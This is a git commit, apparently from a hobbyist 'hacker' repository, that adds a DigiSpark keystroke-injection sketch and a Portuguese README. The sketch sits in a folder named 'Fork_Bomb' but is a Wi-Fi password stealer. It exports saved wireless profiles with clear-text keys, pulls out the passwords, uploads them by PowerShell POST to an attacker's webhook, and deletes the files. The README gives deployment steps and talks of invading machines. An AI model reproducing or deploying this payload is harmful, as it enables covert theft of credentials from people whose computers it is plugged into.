762e78adf4ec12875d09b1460dce92e47250cc2b
Lucas Bustamante <lucascostabustamante@gmail.com>
2023-11-27 22:55:08 -0300

    update

---
+++ payloads/Fork_Bomb/Persistent_Fork_Bomb.ino
@@ -0,0 +1,39 @@
+#include "DigiKeyboard.h"
+#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#define KEY_ENTER 0x28 //Return/Enter Key
+
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+
+void loop() {
+   
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+ 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboard.delay(800);
+  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //aqui abrirá a janela do cmd de formato pequeno (pequeno apenas no WIN10)
+  DigiKeyboard.delay(1300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cd %temp%"); //going to temporary dir
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri <ADICIONE AQUI A URL DO SEU WEBHOOK> -Method POST -InFile Wi-Fi-PASS"); //Insira a URL do seu webhook
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("exit");
+  DigiKeyboard.delay(100);
+  
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+  
+}
---
+++ payloads/Fork_Bomb/README.md
@@ -0,0 +1,15 @@
+# Ladrão de senhas WIFI
+
+Este código foi testado apenas no Windows 10 e 11 e está funiconando perfeitamente.
+
+## Como usar
+Antes de tudo configure seu DigiSpark ([TUTORIAL](https://embarcados.com.br/instalando-o-attiny85-no-windows/))
+
+Configure o URL do seu [WebHook](https://webhook.site/), cole no seu código. ([TUTORIAL](https://rockcontent.com/br/blog/o-que-e-um-webhook/))
+
+Abra este código no Arduino IDE e suba o código para seu DigiSpark.
+
+## Teclado ABNT
+Caso for invadir uma maquina que esteja usando teclado com a configuração Brasil ABNT, 
+
+você terá que fazer mais algumas alterações ([TUTORIAL](https://github.com/lucasbustamante/Digispark_Hacker/tree/master/teclado__abnt))
